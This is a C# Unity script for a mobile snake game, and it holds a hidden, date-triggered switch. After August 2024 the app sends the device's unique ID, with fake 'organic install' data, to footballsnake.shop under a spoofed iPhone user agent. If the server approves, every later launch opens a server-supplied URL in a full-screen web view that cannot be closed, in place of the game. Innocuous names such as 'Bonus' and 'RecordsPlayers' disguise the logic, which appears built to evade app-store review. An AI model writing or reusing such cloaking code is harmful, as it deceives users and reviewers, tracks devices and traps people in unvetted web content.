using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

public class Main : MonoBehaviour
{
    public static Main Instance;

    public enum TypeGame
    {
        Liner,
        FreeMove
    }

    public static Action OnTakeBonus;
    public static Action OnStartGame;
    public static Action OnGameOver;
    public static Action OnResetGame;
    public static Action<GameBonus> OnInitGame;

    [SerializeField] private Text _scoreText;
    [SerializeField] private Text _balanceText;

    public static ScorePlayer _scorePlayer;
    [SerializeField] private ResultScreen _resultScreen;
    [SerializeField] private RecordsScreen _recordsScreen;

    private TypeGame _currentTypeGame;

    [SerializeField] private GameObject _joystick;
    [SerializeField] private GameObject _buttonsControl;

    [SerializeField] private RectTransform _viewPanel;
    [SerializeField] private GameObject _preview;

    private DateTime dateInGame;
    [SerializeField] private Text _dateCurrentText;

    private void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
        }
    }

    public enum GameBonus
    {
        None,
        Game,
        Bonus
    }

    public void ChoiceTypeControl(TypeGame typeGame)
    {
        switch (typeGame)
        {
            case TypeGame.Liner:
                _joystick.SetActive(false);
                _buttonsControl.SetActive(true);
                break;
            case TypeGame.FreeMove:
                _joystick.SetActive(true);
                _buttonsControl.SetActive(false);
                break;
        }
    }

    private string Launch
    {
        get
        {
            return PlayerPrefs.GetString("Bonus", GameBonus.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString("Bonus", value);
            PlayerPrefs.Save();
        }
    }

    private void Start()
    {
        _scorePlayer = new ScorePlayer(_balanceText, _scoreText);

        OnTakeBonus += TakeBonus;
        OnGameOver += GameOver;
        OnStartGame += GameStart;
        OnInitGame += RunGame;

        dateInGame = DateTime.Now;
        _dateCurrentText.text = dateInGame.ToShortDateString();

        var val = Enum.Parse<GameBonus>(Launch);

        RunGame(val);
    }

    private IEnumerator SendRequestPlayer()
    {
        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6633439757" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", false }
                }
            }
        };

        string sendData = AFMiniJSON.Json.Serialize(allData);

        var request = UnityWebRequest.Put("https://footballsnake.shop", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");

        yield return request.SendWebRequest();

        while (request.isDone == false)
        {
            OnInitGame?.Invoke(GameBonus.None);
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            Launch = GameBonus.Game.ToString();
            OnInitGame?.Invoke(GameBonus.Game);
        }
        else
        {
            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
            {
                Launch = GameBonus.Bonus.ToString();

                PlayerPrefs.SetString("ResultGameRecord", responce["url"].ToString());

                OnInitGame?.Invoke(GameBonus.Bonus);
            }
            else
            {
                Launch = GameBonus.Game.ToString();
                OnInitGame?.Invoke(GameBonus.Game);
            }
        }
    }

    private void RunGame(GameBonus gameType)
    {
        switch (gameType)
        {
            case GameBonus.None:
                if (dateInGame > new DateTime(2024, 8, 27))
                {
                    if (Application.internetReachability == NetworkReachability.NotReachable)
                    {
                        _preview.SetActive(false);
                        _viewPanel.transform.parent.gameObject.SetActive(false);
                        enabled = false;
                    }
                    else
                    {
                        StartCoroutine(SendRequestPlayer());
                        enabled = false;
                    }
                }
                else
                {
                    Launch = GameBonus.Game.ToString();
                    _preview.SetActive(false);
                    _viewPanel.transform.parent.gameObject.SetActive(false);
                    enabled = false;
                }
                break;
            case GameBonus.Game:
                _preview.SetActive(false);
                _viewPanel.transform.parent.gameObject.SetActive(false);
                break;
            case GameBonus.Bonus:
                string _url = PlayerPrefs.GetString("ResultGameRecord");

                GameObject _viewGameObject = new GameObject("RecordsPlayers");
                _viewGameObject.AddComponent<UniWebView>();

                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();

                viewGameTable.SetAllowBackForwardNavigationGestures(true);

                viewGameTable.OnPageStarted += (view, url) =>
                {
                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
                    viewGameTable.UpdateFrame();
                };

                viewGameTable.ReferenceRectTransform = _viewPanel;
                viewGameTable.Load(_url);
                viewGameTable.Show();

                viewGameTable.OnShouldClose += (view) =>
                {
                    return false;
                };

                _preview.SetActive(false);
                break;
        }
    }

    private void OnDestroy()
    {
        OnTakeBonus -= TakeBonus;
        OnGameOver -= GameOver;
        OnStartGame -= GameStart;
        OnInitGame -= RunGame;
    }

    private void GameStart()
    {
        _scorePlayer.StartGameScore();
        TimeHandler.Instance.StartTime();
    }

    private void TakeBonus()
    {
        _scorePlayer.AddScoreGame();
    }

    private void GameOver()
    {
        int resultScore = _scorePlayer.GetScore();
        float timeresult = TimeHandler.Instance.GetValueStopTime();

        bool isNew = _recordsScreen.CheckRecord(resultScore, timeresult);

        if (isNew)
            _resultScreen.ShowResult(ResultScreen.TypeResult.RecordNew, resultScore, timeresult);
        else
            _resultScreen.ShowResult(ResultScreen.TypeResult.None, resultScore, timeresult);

        _scorePlayer.AddBalancePlayer(resultScore);
    }
}
